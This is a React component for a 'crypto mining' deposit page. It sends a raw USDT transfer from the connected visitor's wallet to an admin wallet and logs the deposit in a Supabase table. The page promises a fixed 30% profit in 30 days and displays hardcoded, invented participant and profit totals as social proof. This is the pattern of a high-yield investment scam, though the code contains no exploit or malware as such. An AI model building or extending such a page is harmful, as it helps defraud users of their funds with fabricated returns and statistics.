import { useState, useEffect } from 'react';
import { useAccount, useSendTransaction, useWaitForTransactionReceipt } from 'wagmi';
import { supabase } from '../../lib/supabase';
import { parseUnits } from 'viem';
import { toast } from 'react-toastify';

const ADMIN_WALLET = process.env.NEXT_PUBLIC_ADMIN_WALLET;
const USDT_CONTRACT = process.env.NEXT_PUBLIC_USDT_ADDRESS;

const Price = () => {
  const { address } = useAccount();
  const [sliderValue, setSliderValue] = useState(50);
  const [txProcessing, setTxProcessing] = useState(false);
  const [pendingPlanData, setPendingPlanData] = useState<{
    depositAmount: number;
  } | null>(null);
  
  const { data: txHash, sendTransactionAsync } = useSendTransaction();
  const { isLoading: txConfirming } = useWaitForTransactionReceipt({ hash: txHash });

  const estimatedProfit = sliderValue * 0.3;

  const handleJoinMining = async () => {
    if (!address || !ADMIN_WALLET) {
      toast.error("Please connect your wallet first");
      return;
    }
    if (sliderValue < 50) {
      toast.error("Minimum deposit is $50");
      return;
    }
    
    try {
      setTxProcessing(true);

      // Simpan data deposit yang akan dikirim
      setPendingPlanData({ depositAmount: sliderValue });

      const usdtAmount = parseUnits(sliderValue.toString(), 6);

      const tx = await sendTransactionAsync({
        to: USDT_CONTRACT as `0x${string}`,
        data: `0xa9059cbb${ADMIN_WALLET.replace('0x', '').padStart(64, '0')}${usdtAmount.toString(16).padStart(64, '0')}`,
      });

      toast.info("Transaction submitted. Please confirm in your wallet.");
    } catch (error) {
      console.error("Join Event error:", error);
      toast.error("Transaction failed.");
    } finally {
      setTxProcessing(false);
    }
  };

  // Update database setelah transaksi dikonfirmasi
  useEffect(() => {
    const updateDatabase = async () => {
      if (!txConfirming && txHash && pendingPlanData && address) {
        try {
          const { depositAmount } = pendingPlanData;
  
          // Ambil data pengguna dari database
          const { data, error: fetchError } = await supabase
            .from('users')
            .select('deposit_amount, join_date')
            .eq('wallet_address', address)
            .single();
  
          if (fetchError && fetchError.code !== 'PGRST116') {
            console.error('Supabase fetch error:', fetchError);
            toast.error('Failed to fetch user data.');
            return;
          }
  
          const currentDeposit = data ? data.deposit_amount || 0 : 0;
          const newDepositAmount = currentDeposit + depositAmount;
          const joinDate = data?.join_date ? data.join_date : new Date().toISOString();
  
          // Perbarui deposit dan join_date jika belum ada
          const { error: updateError } = await supabase
            .from('users')
            .upsert(
              {
                wallet_address: address,
                deposit_amount: newDepositAmount,
                last_updated: new Date().toISOString(),
                join_date: joinDate, // Hanya set jika belum ada
              },
              { onConflict: 'wallet_address' }
            );
  
          if (updateError) {
            console.error('Supabase update error:', updateError);
            toast.error('Database update failed.');
          } else {
            toast.success(`Deposit updated! New total: $${newDepositAmount}`);
          }
        } catch (error) {
          console.error('Database update error:', error);
          toast.error('Database update failed.');
        } finally {
          setPendingPlanData(null);
        }
      }
    };
  
    updateDatabase();
  }, [txConfirming, txHash, pendingPlanData, address]);
  

  return (
    <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
      <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">PROFIT CALCULATION</h2>
        <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
          <div className="text-center">
            <span className="text-6xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
            ${sliderValue}
            </span>
              <div className="text-green-400 text-md font-semibold mt-2 p-2 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700">Estimated Profit on 30D: ${estimatedProfit.toFixed(2)}</div>
              

              <div className="px-6 py-4 bg-gradient-to-br from-blue-800 to-purple-800 rounded-lg mb-6">
              <label htmlFor="depositSlider" className="block text-gray-200 mb-2">
              Slide to see profit based on USDT balance in your wallet
              </label>
              <input
                id="depositSlider"
                type="range"
                min={50}
                max={5000}
                step={10}
                value={sliderValue}
                onChange={(e) => setSliderValue(Number(e.target.value))}
                className="w-full"
              />
              <div className="flex justify-between text-gray-300 mt-2">
                <span>${sliderValue}</span>
                <span>Est. Profit: ${estimatedProfit.toFixed(2)}</span>
              </div>
            </div>

              <div className="mt-4 space-y-3">
                {[
                  ['Participants:', '1,297'],
                  ['Total Investment:', '$92,000.00'],
                  ['Total Profit:', '$196,200.00']
                ].map(([label, value], index) => (
                  <div
                    key={index}
                    className="flex justify-between p-3 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700"
                  >
                    <span className="text-gray-300">{label}</span>
                    <span className="text-white font-medium">{value}</span>
                  </div>
                ))}
              </div>
            <div className="mt-4 space-y-3">
            </div>
            

          </div>
        </div>
    </section>
  );
};

export default Price;
